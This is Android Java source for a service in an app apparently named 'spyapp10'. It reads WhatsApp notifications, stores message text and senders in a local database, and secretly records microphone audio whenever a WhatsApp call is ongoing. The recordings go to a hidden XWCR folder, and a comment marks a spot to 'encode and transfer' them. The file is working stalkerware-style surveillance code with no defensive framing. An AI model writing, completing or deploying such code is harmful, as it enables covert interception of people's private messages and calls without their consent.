package com.example.vipul.spyapp10;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.Environment;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.text.format.Time;
import android.util.Log;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Calendar;

public class WhtService extends NotificationListenerService {
    Context context;
    MediaRecorder recorder;
    Time today;
    static String pathz;
    Boolean recording;

    @Override
    public void onCreate() {
        super.onCreate();
        context = getApplicationContext();
        recording=false;
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String title,text = null;

        try{
            String pack = sbn.getPackageName();
            if (pack.equals("com.whatsapp")) {

                Calendar c=Calendar.getInstance();
                SimpleDateFormat df=new SimpleDateFormat("dd-MMM-yyyy");
                String day=df.format(c.getTime());
                SimpleDateFormat tf=new SimpleDateFormat("HH:mm");
                String time="DATE- "+day+"  TIME- "+tf.format(c.getTime());
                Bundle extras = null;
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
                    extras = sbn.getNotification().extras;

                    try {
                        if (extras.getCharSequence("android.text") != null) {
                            text = extras.getCharSequence("android.text").toString();
                        } else {
                            if (extras.get("android.textLines") != null) {
                                CharSequence[] charText = (CharSequence[]) extras.get("android.textLines");
                                if (charText.length > 0) {
                                    text = charText[charText.length - 1].toString();
                                }
                            }
                        }
                    } catch (Exception e) {
                        text = ":::";
                    }
                    Log.e("servicewht11", "text=" + text);
                    if (text.equals("Ongoing call")) {
                        Log.e("servicewht11", "outgoing");
                        if (!(recording)) {
                            startRecoding();

                            Log.e("servicewht11", "recording");
                            recording = true;
                        }
                    } else {
                        String ticker = sbn.getNotification().tickerText.toString();
                        try {
                            title = extras.getString("android.title");
                        } catch (Exception e) {
                            title = "::";
                        }
                        Log.e("servicewht11", "ticker=" + ticker);
                        Log.e("servicewht11", "text=" + text);
                        SQLdb sqLdb=new SQLdb(getApplicationContext());
                        sqLdb.open();
                        sqLdb.insertEntry(ticker,text,time,"whatsapp");
                        sqLdb.close();
                    }
                }
            }
        }catch (Exception e){
            Log.e("servicewht11error",e.toString());
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        if(recording){
            Log.e("servicewht11","stop recording");
            stopRecording();
        }
    }
    public void startRecoding() {
        try {
            today = new Time(Time.getCurrentTimezone());
            today.setToNow();
            recorder = new MediaRecorder();
            recorder.reset();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
            String date = today.monthDay + "_" + (today.month + 1) + "_" + today.year;
            String time = today.format("%k_%M_%S");
            File file = createDirIfNotExists(date + "|" + time);
            recorder.setOutputFile(file.getAbsolutePath());
            recorder.prepare();
            recorder.start();
        } catch (Exception e) {
        }
    }

    public void stopRecording() {
        if (recorder != null) {
            recorder.stop();
            recorder.reset();
            recorder.release();
            recorder = null;
            File file = new File(Environment.getExternalStorageDirectory() + "/XWCR/"+pathz+".3GPP");
            //encode and transfer here
            //file.delete();
        }
    }

    public File createDirIfNotExists(String path) {
        File folder = new File(Environment.getExternalStorageDirectory() + "/XWCR");
        if (!folder.exists()) {
            if (!folder.mkdirs()) {
            }
        }
        pathz=path;
        File file = new File(folder,pathz + ".3GPP");
        try {
            if (!file.exists()) {
                if (file.createNewFile()) {

                    Log.e("vipul1_file", "file is created");
                }
            }
        } catch (Exception e) {
        }
        return file;
    }
}